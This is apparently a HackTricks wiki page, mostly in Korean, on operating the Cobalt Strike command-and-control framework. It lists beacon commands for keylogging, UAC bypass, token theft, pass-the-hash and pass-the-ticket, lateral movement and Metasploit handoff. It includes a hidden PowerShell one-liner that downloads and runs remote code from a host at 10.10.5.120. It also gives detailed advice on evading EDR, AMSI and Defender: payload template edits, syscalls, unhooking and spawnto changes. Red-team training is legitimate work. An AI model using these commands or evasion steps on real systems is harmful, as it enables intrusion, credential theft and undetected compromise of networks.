# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`에서 수신할 위치, 사용할 beacon 종류(http, dns, smb...) 등을 선택할 수 있습니다.

### Peer2Peer Listeners

이러한 listeners의 beacon은 C2와 직접 통신할 필요 없이 다른 beacon을 통해 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit`에서 TCP 또는 SMB beacon을 선택해야 합니다.

* **TCP beacon은 선택한 포트에서 listener를 설정합니다**. TCP beacon에 연결하려면 다른 beacon에서 `connect <ip> <port>` 명령을 사용합니다.
* **smb beacon은 선택한 이름의 pipename에서 수신합니다**. SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA 파일용
* **`MS Office Macro`** macro가 포함된 office 문서용
* **`Windows Executable`** .exe, .dll 또는 service .exe용
* **`Windows Executable (S)`** **stageless** .exe, .dll 또는 service .exe용 (staged보다 stageless가 더 좋으며 IoC가 적음)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)`를 사용하면 bitsadmin, exe, powershell 및 python과 같은 형식으로 Cobalt Strike에서 beacon을 다운로드하는 script/executable을 생성합니다.

#### Host Payloads

web server에서 호스팅할 파일이 이미 있다면 `Attacks -> Web Drive-by -> Host File`로 이동하여 호스팅할 파일과 web server config를 선택합니다.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent는 등록/check-in하고 task를 수신하기 위해 Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile)만 사용하면 됩니다. profile에 정의된 동일한 URIs/headers/metadata crypto를 구현하면 Cobalt Strike UI를 재사용하여 tasking과 output을 처리할 수 있습니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (예: `CustomBeacon.cna`)는 non-Windows beacon의 payload generation을 래핑하여 operator가 listener를 선택하고 GUI에서 직접 ELF payloads를 생성할 수 있도록 합니다.
- Team Server에 노출되는 Linux task handlers의 예: `sleep`, `cd`, `pwd`, `shell` (임의의 commands 실행), `ls`, `upload`, `download`, `exit`. 이러한 handlers는 Team Server가 예상하는 task IDs에 매핑되며, 적절한 format으로 output을 반환하도록 server-side에서 구현해야 합니다.
- Linux에서 BOF support는 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)를 사용하여 Beacon Object Files를 in-process로 로드하는 방식으로 추가할 수 있습니다 (Outflank-style BOFs도 지원). 이를 통해 새로운 processes를 생성하지 않고 implant의 context/privileges 내에서 modular post-exploitation을 실행할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>
- Custom beacon에 SOCKS handler를 embed하여 Windows Beacons와의 pivoting parity를 유지할 수 있습니다. Operator가 `socks <port>`를 실행하면 implant는 local proxy를 열어 compromised Linux host를 통해 operator tooling을 internal networks로 라우팅해야 합니다.

## Opsec

### Execute-Assembly

**`execute-assembly`**는 remote process injection을 사용하는 **sacrificial process**에서 지정된 program을 실행합니다. process에 inject하려면 모든 EDR이 검사하는 특정 Win APIs가 사용되므로 매우 noisy합니다. 그러나 동일한 process에 무언가를 로드하는 데 사용할 수 있는 custom tools가 있습니다.

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike에서는 BOF (Beacon Object Files)도 사용할 수 있습니다: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Script `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에 `helpx` command를 생성합니다. 이 command는 commands에 색상을 표시하여 해당 항목이 BOFs (green), Frok&Run (yellow) 및 유사한 항목인지, 또는 ProcessExecution, injection 및 유사한 항목인지 (red) 나타냅니다. 이를 통해 어떤 commands가 더 stealthy한지 파악할 수 있습니다.

### Modern in-process post-execution

Recent versions에서는 classic COFF BOF가 지나치게 제한적인 경우 사용할 수 있는 두 가지 alternatives가 추가되었습니다.

- **Beacon Interpreter**는 Team Server에서 C를 intermediate bytecode로 compile하고 Beacon에 embedded된 VM에서 이를 실행합니다. bytecode는 native executable code가 아닌 data로 유지되므로 BOF를 로드할 때 일반적으로 필요한 추가 executable allocation과 RW-to-RX permission transition을 피할 수 있습니다. Scripts는 Beacon API를 import하고 BOF-style Dynamic Function Resolution (DFR) prototypes를 declare할 수 있습니다.
- **BOF-PE**는 complete EXE 또는 DLL을 현재 Beacon에 로드합니다. 이 format은 Beacon API를 유지하면서 normal PE imports, exception handling, 더욱 풍부한 C++ 및 external libraries를 지원합니다. 이는 작은 COFF BOF보다 무거우므로 추가 runtime이 유용한 경우에만 선택해야 합니다.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
이러한 메커니즘은 loader와 관련된 signal을 줄일 뿐, script의 동작이나 Windows API 호출로 생성되는 telemetry는 줄이지 않습니다.<sup>[[8]](#references)</sup>

### 사용자로 위장하기

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`와 같은 이벤트를 확인할 수 있습니다.

- Security EID 4624 - 모든 interactive logon을 확인하여 일반적인 업무 시간을 파악합니다.
- System EID 12,13 - shutdown/startup/sleep 빈도를 확인합니다.
- Security EID 4624/4625 - 인바운드 유효/유효하지 않은 NTLM 시도를 확인합니다.
- Security EID 4648 - plaintext credential을 사용하여 logon할 때 생성되는 이벤트입니다. 프로세스가 이 이벤트를 생성했다면, 해당 binary에 config file 또는 code 내부에 credential이 clear text로 포함되어 있을 가능성이 있습니다.

Cobalt Strike에서 `jump`를 사용할 때는 새 프로세스가 더 정상적으로 보이도록 `wmi_msbuild` method를 사용하는 것이 좋습니다.

### computer account 사용

Defender는 일반적으로 user가 생성한 이상한 behavior를 확인하며, **service account와 `*$`와 같은 computer account를 monitoring에서 제외하는 경우가 많습니다**. 이러한 account를 사용하여 lateral movement 또는 privilege escalation을 수행할 수 있습니다.

### stageless payload 사용

Stageless payload는 C2 server에서 두 번째 stage를 download할 필요가 없기 때문에 staged payload보다 noise가 적습니다. 즉, initial connection 이후에는 network traffic을 생성하지 않으므로 network-based defense에 탐지될 가능성이 낮습니다.

### Tokens & Token Store

Token을 훔치거나 생성할 때는 주의해야 합니다. EDR은 thread token을 enumerate하여 **다른 user에 속한 token** 또는 프로세스 내부의 SYSTEM token까지 탐지할 수 있습니다.

이를 통해 token을 **beacon별로 저장**할 수 있으므로 동일한 token을 반복해서 훔칠 필요가 없습니다. 이는 lateral movement를 수행하거나 훔친 token을 여러 번 사용해야 할 때 유용합니다.

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Lateral movement를 수행할 때는 일반적으로 새 token을 **생성하거나 pass the hash attack을 수행하는 것보다 token을 훔치는 편이** 좋습니다.

### Guardrails

Cobalt Strike에는 Defender가 탐지할 수 있는 특정 command 또는 action의 사용을 방지하는 **Guardrails**라는 기능이 있습니다. Guardrails는 lateral movement 또는 privilege escalation에 일반적으로 사용되는 `make_token`, `jump`, `remote-exec` 등의 특정 command를 차단하도록 구성할 수 있습니다.

또한 repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks)에도 payload를 실행하기 전에 고려할 수 있는 몇 가지 check와 아이디어가 포함되어 있습니다.

### Tickets encryption

AD에서는 ticket의 encryption에 주의해야 합니다. 일부 tool은 기본적으로 Kerberos ticket에 RC4 encryption을 사용하지만, 이는 AES encryption보다 보안성이 낮으며 최신 environment에서는 기본적으로 AES를 사용합니다. Weak encryption algorithm을 monitoring하는 Defender가 이를 탐지할 수 있습니다.

### Defaults 피하기

Cobalt Strike를 사용할 때 기본적으로 SMB pipe의 이름은 `msagent_####`와 `"status_####"`입니다. 이러한 이름을 변경하십시오. 다음 command를 사용하여 Cobalt Strike에서 기존 pipe의 이름을 확인할 수 있습니다: `ls \\.\pipe\`

또한 SSH session에서는 `\\.\pipe\postex_ssh_####`라는 pipe가 생성됩니다. `set ssh_pipename "<new_name>";`을 사용하여 변경하십시오.

poext exploitation attack에서도 `\\.\pipe\postex_####` pipe를 `set pipename "<new_name>"`으로 수정할 수 있습니다.

Cobalt Strike profile에서는 다음과 같은 항목도 수정할 수 있습니다.

- `rwx` 사용 피하기
- process injection behavior가 동작하는 방식 (`process-inject {...}` block에서 사용되는 API)
- `"fork and run"`의 동작 방식 (`post-ex {…}` block)
- sleep time
- memory에 load할 binary의 최대 크기
- `stage {...}` block을 사용한 memory footprint와 DLL content
- network traffic

### Sleepmask와 BeaconGate

Sleepmask는 Beacon과 dormant 상태에서 추적 중인 heap allocation을 변환한 다음, task 실행을 위해 이를 복원합니다. 최신 release에서는 기본적으로 evasive한 동작을 제공하지만, memory layout, allocation 또는 call-stack 요구 사항이 다른 경우에는 custom Sleepmask BOF가 여전히 유용합니다. 4.13부터는 기본 Sleepmask가 BeaconGate를 통해 proxy되는 API의 return address도 spoof합니다.<sup>[[8]](#references)</sup>

**BeaconGate**는 이 설계를 `Sleep` 이상으로 확장합니다. 선택된 WinAPI call은 `FUNCTION_CALL` structure로 표현되어 Sleepmask BOF로 전달되며, 이 BOF는 call을 실행하는 동안 Beacon을 mask할 수 있습니다. Profile에서는 group(`Comms`, `Core`, `Cleanup` 또는 `All`) 단위로 gate를 설정하거나 개별 API만 지정할 수 있습니다.<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
`beacon_gate`에 나열된 API의 경우 gate가 `syscall_method`보다 우선 적용됩니다. 나열되지 않은 API는 구성된 syscall method를 계속 사용할 수 있습니다. `beacon_gate disable`과 `beacon_gate enable`은 runtime에 해당 기능을 전환합니다. `All`을 무조건 활성화하지 마세요. `ps`와 같은 명령은 `OpenProcess`/`CloseHandle`을 반복적으로 호출하므로, 모든 호출에서 Beacon을 mask하고 unmask하면 CPU spike가 발생할 수 있습니다. Sleepmask-VS는 custom gate를 디버깅할 수 있도록 모의 Beacon/Sleepmask 상태를 제공하므로, live implant를 통해 반복적으로 테스트할 필요가 없습니다.<sup>[[9]](#references)</sup>

### Noisy proc injections

프로세스에 code를 injection할 때는 일반적으로 매우 noisy합니다. **일반적인 프로세스는 보통 이러한 작업을 수행하지 않으며, 이를 수행하는 방법도 매우 제한적이기 때문입니다**. 따라서 behaviour-based detection systems에서 이를 탐지할 수 있습니다. 또한 EDR이 네트워크를 scan하여 **disk에 존재하지 않는 code를 포함한 threads**를 탐지할 수도 있습니다(브라우저와 같이 JIT를 사용하는 프로세스에서는 이러한 경우가 흔하지만). Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

새 process를 spawn할 때는 detection을 피하기 위해 process 간에 **일반적인 parent-child** relationship을 유지하는 것이 중요합니다. svchost.exec가 iexplorer.exe를 실행한다면 의심스럽게 보일 수 있습니다. 일반적인 Windows environment에서 svchost.exe는 iexplorer.exe의 parent가 아니기 때문입니다.

Cobalt Strike에서 새 beacon을 spawn하면 기본적으로 **`rundll32.exe`**를 사용하는 process가 생성되어 새 listener를 실행합니다. 이는 stealth 측면에서 좋지 않으며 EDR에서 쉽게 탐지할 수 있습니다. 또한 `rundll32.exe`가 아무런 args 없이 실행되므로 더욱 의심스럽습니다.

다음 Cobalt Strike command를 사용하면 새 beacon을 spawn할 다른 process를 지정하여 detection 가능성을 낮출 수 있습니다:
```bash
spawnto x86 svchost.exe
```
프로필에서 이 설정 **`spawnto_x86` and `spawnto_x64`**도 변경할 수 있습니다.

### 공격자 traffic 프록시

공격자는 때때로 Linux 시스템에서도 도구를 로컬로 실행하고, victim의 traffic이 해당 도구에 도달하도록 해야 합니다(예: NTLM relay).

또한 때때로 pass-the.hash 또는 pass-the-ticket attack을 수행할 때, victim 시스템의 LSASS process를 수정하는 대신 **이 hash 또는 ticket을 자신의 로컬 LSASS process에 추가한 다음**, 이를 통해 pivot하는 편이 더 stealthier합니다.

하지만 **생성되는 traffic에 주의해야 합니다**. backdoor process에서 흔하지 않은 traffic(Kerberos?)을 전송할 수 있기 때문입니다. 이를 위해 browser process로 pivot할 수 있지만, process에 자신을 injecting하는 과정에서 탐지될 수 있으므로 stealth한 방법을 고려해야 합니다.


### AV 회피

#### AV/AMSI/ETW Bypass

다음 페이지를 확인하세요:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 Cobalt Strike가 binary beacon을 생성하는 데 사용할 payload의 code와 pre-compiled template(`/src-common`)를 찾을 수 있습니다.

생성된 backdoor(또는 단순히 compiled template)에 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 Defender가 trigger되는 원인을 찾을 수 있습니다. 보통은 string입니다. 따라서 backdoor를 생성하는 code를 수정하여 해당 string이 최종 binary에 나타나지 않도록 할 수 있습니다.

code를 수정한 후 같은 directory에서 `./build.sh`를 실행하고 `dist-pipe/` folder를 Windows client의 `C:\Tools\cobaltstrike\ArtifactKit`에 복사하세요.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
공격적인 script `dist-pipe\artifact.cna`를 로드하여 Cobalt Strike가 로드된 리소스가 아닌 우리가 원하는 디스크의 리소스를 사용하도록 하는 것을 잊지 마세요.

#### Resource Kit

ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 script-based payload용 템플릿이 포함되어 있습니다.

템플릿과 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 Defender가(이 경우 AMSI가) 어떤 부분을 싫어하는지 확인하고 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 줄을 수정하면 탐지되지 않는 template을 생성할 수 있습니다.

Cobalt Strike가 로드된 리소스가 아닌, 우리가 원하는 디스크의 리소스를 사용하도록 하려면 aggressive script `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.

#### Function hooks | Syscall

Function hooking은 ERD가 악성 activity를 탐지하는 데 사용하는 매우 일반적인 방법입니다. Cobalt Strike는 표준 Windows API 호출 대신 **syscalls**를 사용하여 이러한 hooks를 우회할 수 있습니다. 이를 위해 **`None`** config를 사용하거나, **`Direct`** setting으로 함수의 `Nt*` version을 사용하거나, malleable profile에서 **`Indirect`** option을 사용하여 `Nt*` function을 건너뛸 수 있습니다. 시스템에 따라 어떤 option이 다른 option보다 더 stealth할 수 있습니다.

이는 profile에서 설정하거나 **`syscall-method`** command를 사용하여 설정할 수 있습니다.

그러나 이 방법 역시 noisy할 수 있습니다.

Cobalt Strike가 function hooks를 우회하기 위해 제공하는 일부 option은 다음 도구를 사용하여 해당 hooks를 제거하는 것입니다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

다음 도구를 사용하여 어떤 functions가 hooked되었는지 확인할 수도 있습니다: [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>기타 Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF 템플릿](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike 메타데이터 암호화에 대한 Unit42 분석](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic에 대한 SANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: 번역 중 길을 잃다](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: BeaconGate를 통해](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
